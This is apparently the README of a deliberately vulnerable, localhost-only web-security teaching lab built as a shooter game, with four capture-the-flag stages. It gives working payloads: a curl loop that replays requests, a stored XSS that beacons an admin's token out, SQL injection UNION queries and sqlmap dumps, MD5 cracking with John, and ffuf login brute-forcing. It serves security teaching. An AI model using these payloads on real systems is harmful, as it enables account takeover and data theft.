# MONSTER ARENA // Web-Security Lab

A playable top-down survival shooter that is also a **deliberately vulnerable web
app**. Kill monsters, bank gold and EXP, climb the public leaderboard, and talk
trash in global chat — then break it four different ways.

> ⚠️ This app is **deliberately insecure** (replayable actions, a stored XSS sink,
> SQL injection, unsalted MD5 passwords, long-lived bearer tokens in
> `localStorage`). For classroom use only — **never deploy.** It binds to
> `127.0.0.1` and never talks to any host but your own machine.

Builds on last section (**Broken Authentication / Broken Access Control**): here
the payoff of stealing an admin **session** instead of its password lands hard.

---

## Run it

Requires Node.js 18+.

```bash
npm install
npm start          # -> node server.js
```

Open **http://localhost:3003** and **Register** a player (or use a seeded login
below). The server prints a localhost banner on boot. State resets every restart.

Seeded logins (username / password): `xX_sniper_Xx / iloveyou`,
`noob_slayer / princess`, `dark_knight / password1`.

**Controls:** WASD move · mouse aim · click/hold shoot · `R` reload · `1`–`3`
switch weapon · `E` bank loot · `Esc` pause. Ammo is limited — grab **ammo boxes**
for spare rounds (your per-weapon ammo lives in `localStorage['ma_ammo']`, and
your carried loot in `localStorage['ma_backpack']` — both are yours to… adjust).

---

## The mission

There are **four flags** (`FLAG{...}`). Each is handed over by the API only when
the matching exploit actually works — proof, not a hint. The browser game never
shows a flag; you will only see them in raw API responses.

```
STAGE 1  Replay    break onto the TOP 3 by replaying a kill       -> FLAG{replay_...}
STAGE 2  XSS       your podium NAME runs in the GameMaster's tab   -> FLAG{stored_xss_...}
STAGE 3  SQLi      dump the players table through player search    -> FLAG{sqli_...}
STAGE 4  MD5       crack a dumped hash with rockyou, then log in   -> FLAG{md5_...}
```

Stages 1→2 chain (replay is how you reach the XSS). Stages 3→4 chain (the dump
feeds the cracker). You can start on either side.

Your tools are the usual web ones: **browser DevTools**, **curl**, **ffuf**,
**Burp Suite**, **sqlmap**, and **John the Ripper** (with `rockyou.txt`).
`usernames.txt` and `passwords.txt` are provided for fuzzing.

---

## Stage 1 — Replay a kill onto the podium  (A04)

Monsters spawn once every 30s and are tanky, and the #2/#3 scores are thousands
of points away. You will never grind there honestly — **so don't.**

Play one real kill with DevTools → Network open, and find the request:

```
POST /api/kill     body: {"id":<n>,"nonce":"<hex>"}     -> {"score":...,"level":...}
```

The server credits that request **every time it arrives** and never checks that
the kill was real. Replay it. In Burp: send to **Repeater** and mash *Send*, or
**Intruder** with a null payload for a few hundred reps. With `curl`:

```bash
TOK=<your bearer token from DevTools -> Application -> localStorage -> ma_token>
for i in $(seq 1 200); do
  curl -s -X POST http://localhost:3003/api/kill \
    -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
    -d '{"id":1,"nonce":"x"}' >/dev/null
done
```

The kill response that first pushes you into the **top 3** carries **F1**. Refresh
the leaderboard — you are on the podium.

**Bonus — trust the client, lose the game.** Gold coins you pick up are stashed
in your *browser's own* `localStorage` under `ma_backpack`, and the **Bank** button
(press `E`) cashes them out via `POST /api/cashout {gold}` — which banks whatever
number your browser claims. Open DevTools → Application → Local Storage, set
`ma_backpack` to `{"gold":999999}`, press `E`, and take `#1` outright. (That
cash-out request is replayable too.) The lesson: anything the client stores or
reports can be forged — authority must live on the server.

## Stage 2 — Your name is an XSS, and the GameMaster is watching  (A03)

When anyone breaks into the top 3, the server posts to global chat:
`🏆 <name> smashed into the TOP 3!`. Normal chat messages are escaped — but the
**announcement renders your name as raw HTML.** And the GameMaster is online,
watching chat.

First arm your name, then (re)take the podium so the announcement fires:

```bash
# set your display name to a payload (localStorage key is ma_token)
curl -s -X PATCH http://localhost:3003/api/account \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  --data '{"displayName":"<img src=x onerror=\"new Image().src='http://localhost:3003/api/collect?c='+localStorage.getItem('ma_token')\">"}'
```

(`/api/collect` is a built-in drop box so you need no external listener — point
the beacon there, or at your own `nc`/`http.server`.) Replay onto the podium
again; within a few seconds the GameMaster's browser runs your payload and the
stolen token lands here:

```bash
curl -s http://localhost:3003/api/collect/peek     # -> {"captured":"<admin token>", ...}
```

Use it as the admin — `GET /api/me` with the stolen token returns role `admin`
and **F2**:

```bash
curl -s http://localhost:3003/api/me -H "Authorization: Bearer <STOLEN_TOKEN>"
```

> Why this works: the session token lives in `localStorage`, so any script can
> read it. An `HttpOnly` cookie could not be stolen this way.

## Stage 3 — SQL injection in player search  (A03)

Every logged-in player can search others: `GET /api/players/search?q=`. The `q`
goes straight into the SQL. A lone quote breaks the query — the only signal is
the HTTP status (no error text leaks):

```bash
curl -s -o /dev/null -w '%{http_code}\n' -G http://localhost:3003/api/players/search \
  -H "Authorization: Bearer $TOK" --data-urlencode "q='"        # 500 (q=sniper -> 200)
```

Results reflect in-band, so a 4-column `UNION` dumps data. Dump the players
table (hashes and all):

```bash
curl -s -G http://localhost:3003/api/players/search -H "Authorization: Bearer $TOK" \
  --data-urlencode "q=zzz' UNION SELECT id, username, password_md5, role FROM players-- "
```

The `secrets` table carries **F3**:

```bash
curl -s -G http://localhost:3003/api/players/search -H "Authorization: Bearer $TOK" \
  --data-urlencode "q=zzz' UNION SELECT id, label, value, NULL FROM secrets-- "
```

Or let **sqlmap** do it (bearer header, SQLite):

```bash
sqlmap -u "http://localhost:3003/api/players/search?q=bob" \
  --headers="Authorization: Bearer $TOK" --dbms=sqlite --batch -T players --dump
```

## Stage 4 — Crack the dump with rockyou, then log in  (A02)

The dumped `password_md5` values are **unsalted MD5**. Save them as
`user:hash` and run John:

```bash
# hashes.txt : one md5 per line (or user:md5 for john's --username)
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt
```

Everyone except the GameMaster uses a rockyou password — they fall in seconds.
Log in as a cracked player; their private `stash` on `GET /api/me` holds **F4**:

```bash
curl -s -X POST http://localhost:3003/api/login -H 'Content-Type: application/json' \
  -d '{"username":"pro_gamer_99","password":"<cracked>"}'   # -> token
curl -s http://localhost:3003/api/me -H "Authorization: Bearer <that token>"   # stash = F4
```

The GameMaster's hash is in the dump too, but its password is long and random —
it will **not** crack. That is the point: in Stage 2 you never needed it.

---

## Fuzzing quick-reference (ffuf)

Every outcome is a meaningful status code, there are no redirects, and bodies are
JSON — so the **status code is the signal**.

```bash
# which usernames exist? (login: 404 unknown vs 401 known-wrong-password)
ffuf -w usernames.txt -u http://localhost:3003/api/login -X POST \
  -H 'Content-Type: application/json' -d '{"username":"FUZZ","password":"x"}' -mc 401

# brute a weak account (no rate limit) — match 200
ffuf -w passwords.txt -u http://localhost:3003/api/login -X POST \
  -H 'Content-Type: application/json' -d '{"username":"noob_slayer","password":"FUZZ"}' -mc 200
```

## What to hand in

The four flags, each with one line on how you got it — **plus**, for each, the
one-sentence real-world fix (see `VULNERABILITIES.md` for the fix of every bug).
